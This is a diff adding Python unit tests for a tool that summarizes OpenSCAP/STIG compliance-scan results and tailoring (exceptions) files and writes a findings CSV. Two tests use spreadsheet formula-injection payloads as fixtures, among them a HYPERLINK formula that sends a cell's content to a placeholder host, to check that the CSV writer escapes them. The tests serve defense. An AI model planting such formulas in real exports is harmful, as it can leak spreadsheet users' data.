@@ -152,6 +152,308 @@ class AssessmentTests(unittest.TestCase):
             xccdf.summarize(self.result([("rule", "success")]))
 
 
+class AssessmentContentTests(unittest.TestCase):
+    """What the summary says about the content, the failing rules and an exceptions file.
+
+    The fixtures follow the layout of results that OpenSCAP 1.3 and Ubuntu's usg
+    wrote for RHEL 9, AlmaLinux 9 and Ubuntu 24.04: a Benchmark that carries its
+    profiles and rules, with one TestResult at its end.
+    """
+
+    NS = "http://checklists.nist.gov/xccdf/1.2"
+    VENDOR = "xccdf_org.ssgproject.content_"
+    HREF = "https://www.cyber.mil/stigs/downloads/?_dl_facet_stigs=operating-systems%2Cunix-linux"
+    # rule, severity, STIG IDs, outcome
+    RULES = (("grub2_password", "high", ["RHEL-09-212010"], "fail"),
+             ("sshd_disable_empty_passwords", "high", ["RHEL-09-255040"], "pass"),
+             ("package_aide_installed", "medium", ["RHEL-09-651010"], "fail"),
+             ("partition_for_tmp", "low", ["RHEL-09-231015"], "fail"),
+             ("audit_rules_login_events", "medium", ["RHEL-09-654250", "RHEL-09-654255"], "fail"),
+             ("ensure_gpgcheck_local", "unknown", [], "fail"),
+             ("banner_text", "medium", ["RHEL-09-211020"], "notchecked"),
+             ("usb_storage", "medium", ["RHEL-09-291010"], "notselected"))
+
+    def vendor(self, rules=RULES, profile_version="<version>V2R9</version>", profile="profile_stig"):
+        rule_xml = "".join(
+            f'<Rule id="{self.VENDOR}rule_{name}" severity="{severity}"><title>Title of {name}</title>'
+            f'<reference href="https://www.cisecurity.org/controls/">12</reference>'
+            + "".join(f'<reference href="{self.HREF}">{stig_id}</reference>' for stig_id in stig_ids) + "</Rule>"
+            for name, severity, stig_ids, _outcome in rules)
+        results = "".join(
+            f'<rule-result idref="{self.VENDOR}rule_{name}" severity="{severity}"><result>{outcome}</result></rule-result>'
+            for name, severity, _stig_ids, outcome in rules)
+        return ET.fromstring(
+            f'<Benchmark xmlns="{self.NS}" id="{self.VENDOR}benchmark_RHEL-9">'
+            '<title>Guide to the Secure Configuration of Red Hat Enterprise Linux 9</title><version>0.1.82</version>'
+            f'<Profile id="{self.VENDOR}profile_cis"><title>CIS</title></Profile>'
+            f'<Profile id="{self.VENDOR}profile_stig">{profile_version}'
+            '<title>DISA STIG for Red Hat Enterprise Linux 9</title></Profile>'
+            f'<Group id="g">{rule_xml}</Group>'
+            '<TestResult id="result" test-system="cpe:/a:redhat:openscap:1.3.14">'
+            f'<benchmark href="/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml" id="{self.VENDOR}benchmark_RHEL-9"/>'
+            f'<profile idref="{self.VENDOR}{profile}"/>{results}</TestResult></Benchmark>')
+
+    def tailoring(self, profiles=None):
+        profiles = profiles if profiles is not None else (
+            f'<Profile id="{self.VENDOR}profile_stig_site" extends="{self.VENDOR}profile_stig">'
+            '<title>Site exceptions</title>'
+            f'<select idref="{self.VENDOR}rule_partition_for_tmp" selected="false"/>'
+            f'<select idref="{self.VENDOR}rule_grub2_password" selected="false"/>'
+            f'<select idref="{self.VENDOR}rule_usb_storage" selected="true"/>'
+            f'<set-value idref="{self.VENDOR}value_var_password_pam_minlen">15</set-value></Profile>')
+        return ET.fromstring(f'<Tailoring xmlns="{self.NS}" id="xccdf_site_tailoring_default">'
+                             '<benchmark href="/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml"/>'
+                             f'<version time="2026-11-13T00:00:00">1</version>{profiles}</Tailoring>')
+
+    def test_the_vendor_profile_states_the_stig_release_it_follows(self):
+        content = xccdf.summarize(self.vendor())["content"]
+        self.assertEqual(content["stig_release"], "V2R9")
+        self.assertEqual(content["benchmark_version"], "0.1.82")
+        self.assertEqual(content["file"], "/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml")
+        self.assertEqual(content["line"],
+                         "STIG release V2R9: profile 'DISA STIG for Red Hat Enterprise Linux 9' in 'Guide to the "
+                         "Secure Configuration of Red Hat Enterprise Linux 9' 0.1.82, file "
+                         "/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml, scanner cpe:/a:redhat:openscap:1.3.14")
+
+    def test_content_that_states_no_release_is_reported_as_such(self):
+        content = xccdf.summarize(self.vendor(profile_version=""))["content"]
+        self.assertIsNone(content["stig_release"])
+        self.assertTrue(content["line"].startswith("STIG release not stated by the content: profile 'DISA STIG"))
+        # A bare TestResult, without its benchmark, still summarizes.
+        bare = ET.fromstring(f'<TestResult xmlns="{self.NS}" id="r"><profile idref="p"/>'
+                             '<rule-result idref="a"><result>fail</result></rule-result></TestResult>')
+        report = xccdf.summarize(bare)
+        self.assertEqual(report["content"]["line"], "STIG release not stated by the content: profile 'p'")
+        self.assertEqual(report["failed_by_category"], {"CAT I": 0, "CAT II": 0, "CAT III": 0, "unrated": 1})
+
+    def test_a_disa_benchmark_states_its_release_in_its_version(self):
+        root = ET.fromstring(
+            f'<Benchmark xmlns="{self.NS}" id="xccdf_mil.disa.stig_benchmark_RHEL_9_STIG">'
+            '<title>Red Hat Enterprise Linux 9 STIG SCAP Benchmark</title>'
+            '<plain-text id="release-info">Benchmark Date: 30 Sep 2026</plain-text><version>002.010</version>'
+            '<Profile id="xccdf_mil.disa.stig_profile_MAC-1_Classified"><title>I - Mission Critical Classified</title>'
+            '</Profile><Group id="g"><Rule id="xccdf_mil.disa.stig_rule_SV-257777r1155676_rule" severity="high">'
+            '<version>RHEL-09-211010</version><title>RHEL 9 must be a vendor-supported release.</title></Rule></Group>'
+            '<TestResult id="r"><benchmark href="content.xml" id="xccdf_mil.disa.stig_benchmark_RHEL_9_STIG"/>'
+            '<profile idref="xccdf_mil.disa.stig_profile_MAC-1_Classified"/>'
+            '<rule-result idref="xccdf_mil.disa.stig_rule_SV-257777r1155676_rule" severity="high"><result>fail</result>'
+            '</rule-result></TestResult></Benchmark>')
+        report = xccdf.summarize(root)
+        self.assertEqual(report["content"]["stig_release"], "V2R10")
+        self.assertIn("STIG release V2R10 (Benchmark Date: 30 Sep 2026): profile 'I - Mission Critical Classified'",
+                      report["content"]["line"])
+        # DISA names the STIG ID in the rule's version.
+        self.assertEqual(report["failed_cat_i_ids"], ["RHEL-09-211010"])
+        self.assertEqual(report["failed_cat_i"],
+                         ["RHEL-09-211010 (SV-257777r1155676_rule): RHEL 9 must be a vendor-supported release."])
+
+    def test_failing_rules_are_counted_by_disa_category(self):
+        report = xccdf.summarize(self.vendor())
+        self.assertEqual(report["failed_by_category"], {"CAT I": 1, "CAT II": 2, "CAT III": 1, "unrated": 1})
+        self.assertEqual(report["failed_cat_i"], ["RHEL-09-212010 (grub2_password): Title of grub2_password"])
+        self.assertEqual(report["failed_cat_i_ids"], ["RHEL-09-212010"])
+        # One rule can answer two STIG IDs; a slash keeps them together in a list of IDs.
+        both = tuple((name, "high", ids, outcome) if name == "audit_rules_login_events" else (name, severity, ids, outcome)
+                     for name, severity, ids, outcome in self.RULES)
+        self.assertEqual(xccdf.summarize(self.vendor(both))["failed_cat_i_ids"],
+                         ["RHEL-09-212010", "RHEL-09-654250/RHEL-09-654255"])
+        # The counts of earlier summaries are unchanged by the new keys.
+        self.assertEqual(report["outcome_instances"]["fail"], 5)
+        self.assertEqual(report["selected_rule_ids"], 7)
+
+    def test_open_rules_are_listed_most_severe_first_with_their_stig_ids(self):
+        rows = xccdf.open_findings(self.vendor())
+        self.assertEqual([(row["category"], row["result"], " ".join(row["stig_ids"])) for row in rows],
+                         [("CAT I", "fail", "RHEL-09-212010"),
+                          ("CAT II", "fail", "RHEL-09-651010"),
+                          ("CAT II", "fail", "RHEL-09-654250 RHEL-09-654255"),
+                          ("CAT II", "notchecked", "RHEL-09-211020"),
+                          ("CAT III", "fail", "RHEL-09-231015"),
+                          ("unrated", "fail", "")])
+        # The full rule ID is what an exceptions file names.
+        self.assertEqual(rows[0]["rule_id"], f"{self.VENDOR}rule_grub2_password")
+        # Passing and unselected rules are not findings.
+        self.assertNotIn(f"{self.VENDOR}rule_usb_storage", [row["rule_id"] for row in rows])
+
+    def test_content_without_stig_ids_is_listed_by_rule_name(self):
+        # Rocky Linux's data stream carries the RHEL 9 profile without STIG references.
+        rules = tuple((name, severity, [], outcome) for name, severity, _ids, outcome in self.RULES)
+        report = xccdf.summarize(self.vendor(rules))
+        self.assertEqual(report["failed_cat_i_ids"], ["grub2_password"])
+        self.assertEqual(report["failed_cat_i"], ["(grub2_password): Title of grub2_password"])
+
+    def test_an_exceptions_file_is_described(self):
+        described = xccdf.describe_tailoring(self.tailoring())
+        self.assertEqual(described["profile_id"], f"{self.VENDOR}profile_stig_site")
+        self.assertEqual(described["extends"], f"{self.VENDOR}profile_stig")
+        self.assertEqual(described["left_out"], [f"{self.VENDOR}rule_grub2_password", f"{self.VENDOR}rule_partition_for_tmp"])
+        self.assertEqual((described["left_out_count"], described["selected_count"], described["values_set"]), (2, 1, 1))
+        self.assertEqual(described["benchmark"], "/usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml")
+
+    def test_the_vendor_tools_own_files_are_read(self):
+        # The shapes autotailor (openscap-utils 1.3.14) and usg 24.04.8 wrote in the November 2026 run.
+        autotailor = ET.fromstring(
+            '<?xml version="1.0" ?>\n'
+            '<xccdf-1.2:Tailoring xmlns:xccdf-1.2="http://checklists.nist.gov/xccdf/1.2" id="xccdf_auto_tailoring_default">\n'
+            '\t<xccdf-1.2:benchmark href="file:///usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml"/>\n'
+            '\t<xccdf-1.2:version time="2026-11-13T11:16:53.448456">1</xccdf-1.2:version>\n'
+            f'\t<xccdf-1.2:Profile id="{self.VENDOR}profile_stig_site" extends="{self.VENDOR}profile_stig">\n'
+            '\t\t<xccdf-1.2:title override="false"/>\n'
+            f'\t\t<xccdf-1.2:select idref="{self.VENDOR}rule_partition_for_tmp" selected="false"/>\n'
+            f'\t\t<xccdf-1.2:select idref="{self.VENDOR}rule_grub2_password" selected="false"/>\n'
+            '\t</xccdf-1.2:Profile>\n'
+            '</xccdf-1.2:Tailoring>\n')
+        described = xccdf.describe_tailoring(autotailor)
+        self.assertEqual((described["profile_id"], described["extends"], described["title"]),
+                         (f"{self.VENDOR}profile_stig_site", f"{self.VENDOR}profile_stig", ""))
+        self.assertEqual((described["left_out_count"], described["selected_count"], described["values_set"]), (2, 0, 0))
+        # usg lists every rule of the profile under a comment with its STIG ID, and every value the profile sets.
+        usg = ET.fromstring(
+            "<?xml version='1.0' encoding='UTF-8'?>\n"
+            '<Tailoring xmlns="http://checklists.nist.gov/xccdf/1.2" id="xccdf_scap-workbench_tailoring_default">\n'
+            '  <benchmark href="/usr/share/usg-benchmarks/ubuntu2404_STIG_1"/>\n'
+            '  <version time="2026-02-27T13:02:25+00:00">1</version>\n'
+            f'  <Profile id="{self.VENDOR}profile_stig_customized" extends="{self.VENDOR}profile_stig">\n'
+            '    <title xmlns:xhtml="http://www.w3.org/1999/xhtml" xml:lang="en-US" override="true">'
+            'DISA-STIG Benchmark [CUSTOMIZED]</title>\n'
+            '    <!--UBTU-24-100010: Ubuntu 24.04 LTS must not have the "systemd-timesyncd" package installed.-->\n'
+            f'    <select idref="{self.VENDOR}rule_package_timesyncd_removed" selected="true"/>\n'
+            '    <!--UBTU-24-101000: Ubuntu 24.04 LTS must allow users to directly initiate a session lock.-->\n'
+            f'    <select idref="{self.VENDOR}rule_vlock_installed" selected="false"/>\n'
+            f'    <set-value idref="{self.VENDOR}value_var_password_pam_minlen">15</set-value>\n'
+            f'    <set-value idref="{self.VENDOR}value_var_accounts_tmout">900</set-value>\n'
+            '  </Profile>\n'
+            '</Tailoring>\n')
+        described = xccdf.describe_tailoring(usg)
+        self.assertEqual(described["left_out"], [f"{self.VENDOR}rule_vlock_installed"])
+        self.assertEqual((described["selected_count"], described["values_set"]), (1, 2))
+        self.assertEqual((described["extends"], described["benchmark"], described["title"]),
+                         (f"{self.VENDOR}profile_stig", "/usr/share/usg-benchmarks/ubuntu2404_STIG_1",
+                          "DISA-STIG Benchmark [CUSTOMIZED]"))
+
+    def test_a_file_that_is_no_single_profile_tailoring_is_refused(self):
+        one = f'<Profile id="a" extends="{self.VENDOR}profile_stig"/>'
+        for root, reason in ((self.vendor(), "root element is not Tailoring"),
+                             (self.tailoring(""), "found 0"), (self.tailoring(one + one), "found 2"),
+                             (self.tailoring('<Profile id="a"/>'), "the profile it extends")):
+            with self.subTest(reason=reason):
+                with self.assertRaisesRegex(ValueError, reason):
+                    xccdf.describe_tailoring(root)
+
+    def test_a_tailored_scan_names_the_release_of_the_profile_it_extends(self):
+        tailoring = dict(xccdf.describe_tailoring(self.tailoring()), sha256="0" * 64)
+        report = xccdf.summarize(self.vendor(profile="profile_stig_site"), tailoring=tailoring)
+        self.assertEqual(report["profile"], f"{self.VENDOR}profile_stig_site")
+        self.assertEqual(report["content"]["stig_release"], "V2R9")
+        self.assertEqual(report["content"]["profile_id"], f"{self.VENDOR}profile_stig")
+        self.assertEqual(report["tailoring"], {"tailoring_id": "xccdf_site_tailoring_default",
+                                               "profile_id": f"{self.VENDOR}profile_stig_site",
+                                               "extends": f"{self.VENDOR}profile_stig",
+                                               "left_out_count": 2, "values_set": 1, "rules_refined_count": 0,
+                                               "sha256": "0" * 64})
+        # Without the file, the tailored profile is not in the benchmark, so no release is claimed.
+        self.assertIsNone(xccdf.summarize(self.vendor(profile="profile_stig_site"))["content"]["stig_release"])
+
+    def run_script(self, *arguments):
+        return subprocess.run(["/usr/bin/python3", "-I", str(ROOT / "scripts" / "summarize_xccdf.py"), *arguments],
+                              capture_output=True, text=True, check=False)
+
+    def test_the_command_writes_the_findings_file_and_reads_an_exceptions_file(self):
+        with tempfile.TemporaryDirectory() as directory:
+            folder = Path(directory)
+            (folder / "audit.xml").write_bytes(ET.tostring(self.vendor(profile="profile_stig_site")))
+            (folder / "tailoring.xml").write_bytes(ET.tostring(self.tailoring()))
+            done = self.run_script(str(folder / "audit.xml"), "--findings", str(folder / "audit-findings.csv"),
+                                   "--tailoring", str(folder / "tailoring.xml"))
+            self.assertEqual((done.returncode, done.stderr), (0, ""))
+            report = json.loads(done.stdout)
+            self.assertEqual((report["findings_file"], report["findings_listed"]),
+                             (str(folder / "audit-findings.csv"), 6))
+            self.assertEqual(report["tailoring"]["left_out_count"], 2)
+            lines = (folder / "audit-findings.csv").read_text().splitlines()
+            self.assertEqual(lines[0], "category,severity,result,stig_id,rule_id,title")
+            self.assertEqual(lines[1], f"CAT I,high,fail,RHEL-09-212010,{self.VENDOR}rule_grub2_password,"
+                                       "Title of grub2_password")
+            self.assertEqual(len(lines), 7)
+            # The file alone: what the playbook reads before it scans.
+            alone = self.run_script("--tailoring", str(folder / "tailoring.xml"))
+            self.assertEqual(alone.returncode, 0)
+            described = json.loads(alone.stdout)
+            self.assertEqual(described["extends"], f"{self.VENDOR}profile_stig")
+            self.assertRegex(described["sha256"], "^[0-9a-f]{64}$")
+            for arguments, message in (((str(folder / "audit.xml"), "--tailoring", str(folder / "audit.xml")),
+                                        "Cannot read the tailoring file: Not an XCCDF 1.2 tailoring file"),
+                                       (("--tailoring", str(folder / "missing.xml")), "Cannot read the tailoring file"),
+                                       ((), "name a results file")):
+                with self.subTest(arguments=arguments):
+                    refused = self.run_script(*arguments)
+                    self.assertIn(refused.returncode, (1, 2))
+                    self.assertEqual(refused.stdout, "")
+                    self.assertIn(message, refused.stderr)
+
+    def test_no_cell_can_run_as_a_spreadsheet_formula(self):
+        # Every cell comes from the scanned machine's results file, the severity and the rule ID included.
+        with tempfile.TemporaryDirectory() as directory:
+            path = Path(directory) / "findings.csv"
+            xccdf.write_findings(path, [{"category": "unrated", "severity": '=hyperlink("http://x/"&a1)', "result": "fail",
+                                         "stig_ids": ["+1"], "rule_id": "\t=1+1", "title": '=HYPERLINK("http://x","y")'},
+                                        {"category": "CAT I", "severity": "high", "result": "fail", "stig_ids": [],
+                                         "rule_id": "  @sum(a1)", "title": "-2+3"},
+                                        {"category": "CAT II", "severity": "medium", "result": "fail",
+                                         "stig_ids": ["RHEL-09-212010"], "rule_id": "rule_a-b", "title": "Plain title"}])
+            import csv
+            with open(path, newline="", encoding="utf-8") as handle:
+                rows = list(csv.reader(handle))[1:]
+            self.assertEqual(rows[0], ["unrated", """'=hyperlink("http://x/"&a1)""", "fail", "'+1", "'\t=1+1",
+                                       """'=HYPERLINK("http://x","y")"""])
+            self.assertEqual(rows[1][4:], ["'  @sum(a1)", "'-2+3"])
+            # An ordinary row is written as it is.
+            self.assertEqual(rows[2], ["CAT II", "medium", "fail", "RHEL-09-212010", "rule_a-b", "Plain title"])
+
+    def test_a_severity_from_the_results_file_reaches_the_findings_file_guarded(self):
+        # Written as it stands in an XML attribute: =HYPERLINK("http://x/"&A1)
+        rules = (("grub2_password", "=HYPERLINK(&quot;http://x/&quot;&amp;A1)", ["RHEL-09-212010"], "fail"),)
+        with tempfile.TemporaryDirectory() as directory:
+            path = Path(directory) / "findings.csv"
+            xccdf.write_findings(path, xccdf.open_findings(self.vendor(rules)))
+            import csv
+            with open(path, newline="", encoding="utf-8") as handle:
+                row = list(csv.reader(handle))[1]
+            self.assertEqual(row[:3], ["unrated", """'=hyperlink("http://x/"&a1)""", "fail"])
+
+    def test_a_file_in_an_encoding_python_does_not_know_is_refused_in_one_line(self):
+        with tempfile.TemporaryDirectory() as directory:
+            odd = Path(directory) / "odd.xml"
+            odd.write_bytes(b'<?xml version="1.0" encoding="no-such-encoding"?><Tailoring/>')
+            for arguments, message in ((("--tailoring", str(odd)), "Cannot read the tailoring file: "),
+                                       ((str(odd),), "Cannot summarize assessment: ")):
+                with self.subTest(arguments=arguments[0]):
+                    refused = self.run_script(*arguments)
+                    self.assertEqual((refused.returncode, refused.stdout), (1, ""))
+                    self.assertTrue(refused.stderr.startswith(message), refused.stderr)
+                    self.assertNotIn("Traceback", refused.stderr)
+
+    def test_what_a_file_changes_is_counted_however_it_is_written(self):
+        # selected is an XML boolean, and refine-rule can stop a rule's check without unselecting it.
+        profile = (f'<Profile id="{self.VENDOR}profile_stig_site" extends="{self.VENDOR}profile_stig">'
+                   f'<select idref="{self.VENDOR}rule_a" selected="0"/>'
+                   f'<select idref="{self.VENDOR}rule_b" selected="false"/>'
+                   f'<select idref="{self.VENDOR}rule_c" selected="1"/>'
+                   f'<select idref="{self.VENDOR}rule_d" selected="true"/>'
+                   f'<refine-rule idref="{self.VENDOR}rule_e" role="unchecked"/>'
+                   f'<refine-rule idref="{self.VENDOR}rule_f" severity="low"/></Profile>')
+        described = xccdf.describe_tailoring(self.tailoring(profile))
+        self.assertEqual(described["left_out"], [f"{self.VENDOR}rule_a", f"{self.VENDOR}rule_b"])
+        self.assertEqual((described["left_out_count"], described["selected_count"]), (2, 2))
+        self.assertEqual(described["rules_refined"], [f"{self.VENDOR}rule_e", f"{self.VENDOR}rule_f"])
+        self.assertEqual(described["rules_refined_count"], 2)
+
+    def test_the_script_keeps_to_the_syntax_of_enterprise_linux_9s_python(self):
+        # The playbook runs it with /usr/bin/python3, which is Python 3.9 on RHEL, AlmaLinux and Rocky Linux 9.
+        import ast
+        ast.parse((ROOT / "scripts" / "summarize_xccdf.py").read_text(), feature_version=(3, 9))
+
+
 class AzureDiskTests(unittest.TestCase):
     """Offline checks of the Azure examples: disk sizes, plans, the preflight, images, NSG rules and VM jobs.
 
